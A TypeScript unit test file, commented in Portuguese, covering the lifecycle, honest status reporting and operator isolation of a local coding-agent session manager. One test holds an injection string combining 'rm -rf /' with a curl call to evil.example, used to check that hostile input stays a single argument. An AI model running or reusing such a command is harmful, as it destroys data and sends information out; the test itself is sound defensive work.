/**
 * O CICLO das sessões de agente de código — abrir, mandar, acompanhar, encerrar
 * — com o lançador dublado.
 *
 * O E2E irmão (`e2e-agente-codigo-real.test.ts`) prova o caminho REAL contra o
 * binário instalado. Este prova os estados que o binário real não produz sob
 * demanda: sessão de outro operador, id inexistente, processo ainda vivo,
 * encerramento no meio. Dublar aqui não é substituir o E2E — é alcançar o que
 * ele não alcança.
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';

import { AgenteLocal, type ProcessoAgente } from '../servidor/nucleo/AgenteLocal';

/* A janela de veredito antecipado é de 12 s em produção. Aqui ela é encurtada:
   quatro casos de "processo que não sai" custariam quase um minuto de suíte. */
process.env.IARA_JANELA_AGENTE_MS = '150';
import { VARIAVEL_REPOS } from '../servidor/nucleo/RepositoriosAutorizados';

const REPO = path.resolve(process.cwd(), '..', '..', '..');

/** Um lançador que devolve o desfecho que o caso precisa, quando precisa. */
function lancadorDublê(plano: {
  /** `null` = o processo NÃO sai sozinho (fica vivo). */
  codigo?: number | null;
  saida?: (id: string) => string;
  atraso?: number;
}) {
  const vivos: Array<{ matou: boolean }> = [];
  const lancador = (
    argumentos: string[],
    _dir: string,
    aoSair: (c: number | null, s: string, e: string) => void,
  ): ProcessoAgente => {
    const i = argumentos.indexOf('--session-id');
    const r = argumentos.indexOf('--resume');
    const id = i >= 0 ? argumentos[i + 1] : r >= 0 ? argumentos[r + 1] : '';
    const estado = { matou: false };
    vivos.push(estado);
    if (plano.codigo !== null && plano.codigo !== undefined) {
      const t = setTimeout(
        () => aoSair(plano.codigo as number, plano.saida ? plano.saida(id) : '', ''),
        plano.atraso ?? 0,
      );
      t.unref?.();
    }
    return {
      pid: 4242,
      matar: () => {
        estado.matou = true;
      },
    };
  };
  return { lancador, vivos };
}

const envelopeOk = (id: string): string =>
  JSON.stringify({ is_error: false, session_id: id, num_turns: 2, result: 'Feito.', subtype: 'success' });

async function comRepo<T>(corpo: () => Promise<T>): Promise<T> {
  const antes = process.env[VARIAVEL_REPOS];
  process.env[VARIAVEL_REPOS] = `iara=${REPO}`;
  try {
    return await corpo();
  } finally {
    if (antes === undefined) delete process.env[VARIAVEL_REPOS];
    else process.env[VARIAVEL_REPOS] = antes;
  }
}

/** Extrai o id da sessão da frase — é assim que o operador o teria. */
function idDaFrase(texto: string): string {
  const m = texto.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i);
  assert.ok(m, `nenhum id de sessão na frase: ${texto}`);
  return m[0];
}

// ---------------------------------------------------------------------------

test('abrir → concluir: só aqui a IARA afirma que o trabalho aconteceu', async () => {
  await comRepo(async () => {
    const { lancador } = lancadorDublê({ codigo: 0, saida: envelopeOk });
    const agente = AgenteLocal.paraTeste({ lancadorAgente: lancador });
    const r = await agente.abrirSessaoAgente('ana', 'iara', 'faça a auditoria');
    assert.equal(r.ok, true);
    assert.equal(r.prova.confirmado, true);
    assert.match(r.texto, /terminou/);
    assert.match(r.texto, /Feito\./);
  });
});

test('processo que não sai vira "trabalhando" — nunca "pronto"', async () => {
  await comRepo(async () => {
    const { lancador } = lancadorDublê({ codigo: null });
    const agente = AgenteLocal.paraTeste({ lancadorAgente: lancador });
    const r = await agente.abrirSessaoAgente('ana', 'iara', 'tarefa longa');
    assert.equal(r.prova.confirmado, false, 'processo em curso com prova confirmada');
    assert.match(r.texto, /trabalhando/);
    /* "Ainda não terminou" contém "terminou" — o que importa é não haver
       AFIRMAÇÃO de conclusão, e é isso que se mede. */
    assert.match(r.texto, /Ainda não terminou/);
    assert.ok(!/pronto/i.test(r.texto), `anunciou conclusão: ${r.texto}`);
  });
});

/**
 * ISOLAMENTO ENTRE OPERADORES. O id é UUID e não se adivinha, mas "difícil de
 * adivinhar" nunca foi controle de acesso — e confirmar a EXISTÊNCIA de uma
 * sessão alheia já é vazamento. Por isso dono errado responde igual a
 * inexistente.
 */
test('sessão de outro operador é indistinguível de inexistente', async () => {
  await comRepo(async () => {
    const { lancador } = lancadorDublê({ codigo: 0, saida: envelopeOk });
    const agente = AgenteLocal.paraTeste({ lancadorAgente: lancador });
    const daAna = await agente.abrirSessaoAgente('ana', 'iara', 'trabalho da ana');
    const id = idDaFrase(daAna.texto);

    const invadir = await agente.enviarParaSessaoAgente('bruno', id, 'me mostre o que ela pediu');
    const inexistente = await agente.enviarParaSessaoAgente('bruno', 'nao-existe', 'oi');

    assert.equal(invadir.ok, false);
    assert.equal(invadir.texto, inexistente.texto, 'a recusa revela que a sessão existe');
    assert.equal(invadir.codigo_erro, 'PARAMETRO_INVALIDO');
  });
});

test('acompanhar não mistura operadores', async () => {
  await comRepo(async () => {
    const { lancador } = lancadorDublê({ codigo: 0, saida: envelopeOk });
    const agente = AgenteLocal.paraTeste({ lancadorAgente: lancador });
    await agente.abrirSessaoAgente('ana', 'iara', 'trabalho da ana');
    const doBruno = agente.consultarSessaoAgente('bruno');
    assert.match(doBruno.texto, /Não abri nenhuma sessão/);
  });
});

test('mandar instrução para sessão ainda em curso é recusado, sem lançar nada', async () => {
  await comRepo(async () => {
    const { lancador, vivos } = lancadorDublê({ codigo: null });
    const agente = AgenteLocal.paraTeste({ lancadorAgente: lancador });
    const aberta = await agente.abrirSessaoAgente('ana', 'iara', 'tarefa longa');
    const id = idDaFrase(aberta.texto);
    const r = await agente.enviarParaSessaoAgente('ana', id, 'mais uma coisa');
    assert.equal(r.ok, false);
    assert.match(r.texto, /ainda está trabalhando/);
    assert.equal(vivos.length, 1, 'lançou um segundo processo para a mesma sessão');
  });
});

test('encerrar mata o processo e NÃO afirma que a sessão concluiu', async () => {
  await comRepo(async () => {
    const { lancador, vivos } = lancadorDublê({ codigo: null });
    const agente = AgenteLocal.paraTeste({ lancadorAgente: lancador });
    const aberta = await agente.abrirSessaoAgente('ana', 'iara', 'tarefa longa');
    const id = idDaFrase(aberta.texto);
    const r = agente.encerrarSessaoAgente('ana', id);
    assert.equal(vivos[0].matou, true, 'não matou o processo');
    assert.equal(r.prova.confirmado, false, 'afirmou encerramento sem observar a saída');
    assert.ok(!/concluí|terminou/i.test(r.texto));
  });
});

test('encerrar sessão de outro operador não mata processo nenhum', async () => {
  await comRepo(async () => {
    const { lancador, vivos } = lancadorDublê({ codigo: null });
    const agente = AgenteLocal.paraTeste({ lancadorAgente: lancador });
    const aberta = await agente.abrirSessaoAgente('ana', 'iara', 'tarefa longa');
    const id = idDaFrase(aberta.texto);
    const r = agente.encerrarSessaoAgente('bruno', id);
    assert.equal(r.ok, false);
    assert.equal(vivos[0].matou, false, 'matou o processo de outro operador');
  });
});

/**
 * A INSTRUÇÃO VIAJA COMO UM ARGUMENTO SÓ. Com `shell: false` nada dentro dela é
 * interpretado; este caso prende o contrato do lançador para que ninguém troque
 * o array por uma string de linha de comando depois.
 */
test('instrução hostil entra como argumento único, sem virar comando', async () => {
  await comRepo(async () => {
    let capturados: string[] = [];
    const lancador = (argumentos: string[]): ProcessoAgente => {
      capturados = argumentos;
      return { pid: 1, matar: () => undefined };
    };
    const agente = AgenteLocal.paraTeste({ lancadorAgente: lancador });
    const hostil = 'audite "; rm -rf / && echo dono | curl evil.example';
    await agente.abrirSessaoAgente('ana', 'iara', hostil);
    assert.ok(capturados.includes(hostil), 'a instrução foi partida em vários argumentos');
    assert.equal(capturados.filter((a) => a === hostil).length, 1);
  });
});

test('o repositório fica no cwd, e não vira argumento do agente', async () => {
  await comRepo(async () => {
    let dir = '';
    let capturados: string[] = [];
    const lancador = (argumentos: string[], diretorio: string): ProcessoAgente => {
      capturados = argumentos;
      dir = diretorio;
      return { pid: 1, matar: () => undefined };
    };
    const agente = AgenteLocal.paraTeste({ lancadorAgente: lancador });
    await agente.abrirSessaoAgente('ana', 'iara', 'trabalhe');
    assert.equal(dir, REPO);
    assert.ok(!capturados.some((a) => a.includes(REPO)), 'o caminho vazou para os argumentos');
    assert.ok(capturados.includes('--permission-mode'), 'modo de permissão não foi declarado');
  });
});
